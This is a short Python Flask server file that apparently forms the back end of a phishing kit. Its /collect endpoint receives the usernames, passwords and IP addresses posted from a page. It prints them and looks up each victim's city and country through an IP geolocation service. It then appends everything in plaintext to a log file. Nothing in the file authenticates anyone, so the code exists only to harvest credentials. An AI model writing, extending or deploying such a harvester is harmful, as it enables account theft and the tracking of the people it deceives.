from flask import Flask, render_template, request, jsonify
import requests
import datetime
import json
import os

app = Flask(__name__)
LOG_FILE = 'logs.json'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/collect', methods=['POST'])
def collect_data():
    data = request.json
    
    # Log credentials and IP
    print(f"[{datetime.datetime.now()}] Received data:")
    print(f"Username: {data.get('username')}")
    print(f"Password: {data.get('password')}")
    print(f"IP Address: {data.get('ip')}")
    
    # Save to log file
    log_entry = {
        "timestamp": str(datetime.datetime.now()),
        "username": data.get('username'),
        "password": data.get('password'),
        "ip": data.get('ip')
    }
    
    # Try to get geolocation
    try:
        geoloc = requests.get(f'http://ip-api.com/json/{data.get("ip")}').json()
        log_entry["location"] = f"{geoloc.get('city')}, {geoloc.get('country')}"
    except Exception as e:
        log_entry["location"] = "Unable to determine"
    
    # Append to log file
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(log_entry) + '\n')
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    # Create logs directory if it doesn't exist
    os.makedirs('logs', exist_ok=True)
    
    # Start the server
    app.run(host='0.0.0.0', port=8000)